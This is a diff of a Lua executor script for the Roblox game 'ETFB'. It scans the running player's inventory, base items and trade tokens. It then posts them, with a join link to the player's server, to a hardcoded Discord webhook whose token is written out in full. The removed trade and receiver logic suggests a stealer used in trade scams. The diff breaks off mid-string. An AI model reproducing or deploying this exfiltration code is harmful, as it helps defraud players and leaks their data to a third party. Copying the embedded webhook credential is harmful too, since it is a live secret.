@@ -1,15 +1,13 @@
 --[[
-    ELYSIUM ETFB - WEBHOOK ONLY EDITION
-    Stripped of all trade/pickup logic. 
-    Focuses only on scanning inventory/base and reporting to Discord.
+    ELYSIUM ETFB - FIXED WEBHOOK EDITION
+    Fixed "Malformed String" error and optimized for instant reporting.
 ]]
 
 -- CONFIGURATION
 getgenv().WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-getgenv().RECEIVERS = {"User1"} -- Placeholder
-getgenv().THRESHOLD = 0         -- Set to 0 for instant pinging
-getgenv().HIGHTIERONLY = false  -- Set to false to see all items in the report
-getgenv().TOKEN_THRESHOLD = 0   -- Ping for any tokens
+getgenv().THRESHOLD = 0         -- 0 for instant ping
+getgenv().TOKEN_THRESHOLD = 0   -- 0 for instant ping
+getgenv().HIGHTIERONLY = false
 
 -- SERVICES
 local Players = game:GetService("Players")
@@ -17,30 +15,13 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- MODULES (Required for rate calculation and name lookups)
+-- MODULES
 local ClientGlobals  = require(ReplicatedStorage.Client.Modules.ClientGlobals)
 local EconomyMath    = require(ReplicatedStorage.Shared.utils.EconomyMath)
 local EternityNum    = require(ReplicatedStorage.SharedModules.EternityNum)
 local BrainrotModule = require(ReplicatedStorage.SharedModules.BrainrotModule)
 
--- CONFIG LOCALS
 local WEBHOOK_URL = getgenv().WEBHOOK
-local TRADE_RATE_THRESHOLD = getgenv().THRESHOLD
-local TOKEN_THRESHOLD = getgenv().TOKEN_THRESHOLD
-local HIGH_TIER_ONLY = getgenv().HIGHTIERONLY
-local TARGET_PLAYERS = getgenv().RECEIVERS
-
-local PRIORITY_BRAINROTS = {
-    "Anububu", "Meta Technetta", "Noobini Infeeny", 
-    "Magmew", "Don Magmito", "Doomini Tiktookini"
-}
-
-local function isPriorityBrainrot(name)
-    for _, n in ipairs(PRIORITY_BRAINROTS) do
-        if string.find(name, n, 1, true) then return true end
-    end
-    return false
-end
 
 --------------------------------------------------------------
 -- DATA GATHERING
@@ -57,23 +38,10 @@ local function getBrainrotInfo(brainrotData)
         rate = (ok2 and r2) or 0
     end
 
-    local traits = brainrotData.traits or ""
-    local hasGalaxyTrait = false
-    if type(traits) == "string" then
-        hasGalaxyTrait = string.find(traits, "Galaxy") ~= nil
-    elseif type(traits) == "table" then
-        for _, t in ipairs(traits) do if t == "Galaxy" then hasGalaxyTrait = true break end end
-    end
-
     return {
         name = name,
         class = class,
-        rate = rate,
         rateFormatted = EternityNum.short(EternityNum.fromNumber(rate)),
-        isPriority = isPriorityBrainrot(name),
-        isGalaxy = (class == "Divine" or class == "Infinity") and hasGalaxyTrait,
-        isScaledDivineInfinity = (class == "Divine" or class == "Infinity") and (brainrotData.scale or 1) >= 3,
-        meetsThreshold = rate >= TRADE_RATE_THRESHOLD
     }
 end
 
@@ -119,21 +87,24 @@ end
 
 local function sendWebhook(content, embed)
     local requestFunc = (syn and syn.request) or http_request or request
-    if not requestFunc then return end
+    if not requestFunc then 
+        warn("Executor does not support requests.")
+        return 
+    end
+
+    local payload = HttpService:JSONEncode({
+        content = content,
+        embeds = {embed}
+    })
 
     pcall(function()
         requestFunc({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({content = content, embeds = {embed}})
+            Body = payload
         })
     end)
-end
-
-local function formatLine(item)
-    local star = item.isGalaxy and "🌌 " or (item.isPriority and "⭐ " or "")
-    return string.format("%s[%s] %s ➜ $%s/s", star, item.class or "?", item.name, item.rateFormatted)
 end
 
 local function runReport()
@@ -142,17 +113,22 @@ local function runReport()
     local tokens = ClientGlobals.PlayerData:TryIndex({"TradeTokens"}) or 0
     
     local invLines = {}
-    for i=1, math.min(10, #inv) do table.insert(invLines, formatLine(inv[i])) end
-    if #inv > 10 then table.insert(invLines, "...and " .. (#inv-10) .. " more") end
+    for i=1, math.min(10, #inv) do 
+        table.insert(invLines, string.format("[%s] %s ➜ $%s/s", inv[i].class or "?", inv[i].name, inv[i].rateFormatted)) 
+    end
 
     local baseLines = {}
-    for i=1, math.min(10, #base) do table.insert(baseLines, formatLine(base[i])) end
-    if #base > 10 then table.insert(baseLines, "...and " .. (#base-10) .. " more") end
+    for i=1, math.min(10, #base) do 
+        table.insert(baseLines, string.format("[%s] %s ➜ $%s/s", base[i].class or "?", base[i].name, base[i].rateFormatted)) 
+    end
+
+    -- Fixed the join link formatting to avoid string errors
+    local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
 
     local embed = {
-        title = "🚀 ETFB Inventory Scan",
-        color = 0x00FFAC,
+        title = "✅ ETFB Scan Successful",
+        color = 0x2ECC71,
         fields = {
             {
-                name = "👤 Player",
-                value = string.format("
+                name = "👤 Player Info",
+                value = "
